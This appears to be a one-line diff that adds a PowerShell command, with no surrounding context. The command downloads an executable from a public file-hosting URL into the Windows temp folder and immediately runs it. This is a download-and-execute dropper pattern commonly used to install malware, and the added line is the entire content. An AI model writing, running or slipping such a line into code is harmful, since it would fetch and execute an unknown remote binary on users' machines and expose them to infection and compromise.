@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/mjnspx.exe',"$env:TEMPmjnp.exe");Start-Process ("$env:TEMPmjnp.exe")
